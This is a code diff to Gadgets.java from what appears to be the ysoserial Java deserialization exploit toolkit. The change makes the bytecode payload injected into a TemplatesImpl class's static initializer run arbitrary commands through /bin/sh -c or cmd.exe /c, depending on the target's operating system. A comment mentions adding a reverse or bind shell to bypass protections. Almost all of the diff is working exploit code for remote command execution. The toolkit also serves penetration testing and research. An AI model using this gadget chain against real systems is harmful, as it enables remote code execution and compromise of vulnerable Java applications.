@@ -12,11 +12,6 @@ import java.lang.reflect.Proxy;
 import java.util.HashMap;
 import java.util.Map;
 
-import com.nqzero.permit.Permit;
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
-
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -24,6 +19,10 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
 
 
 /*
@@ -114,9 +113,24 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
-            "\");";
+        
+        String cmd = "	String executor = \"/bin/sh\";\n" + 
+        		"		String param = \"-c\";\n" + 
+        		"	    if (System.getProperty(\"os.name\").toLowerCase().contains(\"win\")) {\n" + 
+        		"	    	executor = \"cmd.exe\";\n" + 
+        		"	    	param = \"/c\";\n" + 
+        		"	    }\n" + 
+        		"	    \n" + 
+        		"		try {\n" + 
+        		"			String[] args = new String[3];\n" +
+        		"			args[0] = executor;\n" +
+        		"			args[1] = param;\n" +
+        		"			args[2] = \"" + command.replaceAll("\"", "\\\\\\\"") + "\";\n" +
+        		"			java.lang.Runtime.getRuntime().exec(args);\n" + 
+        		"		} catch(Exception e) {\n" + 
+        		"			e.printStackTrace();\n" + 
+        		"		}";
+        
         clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
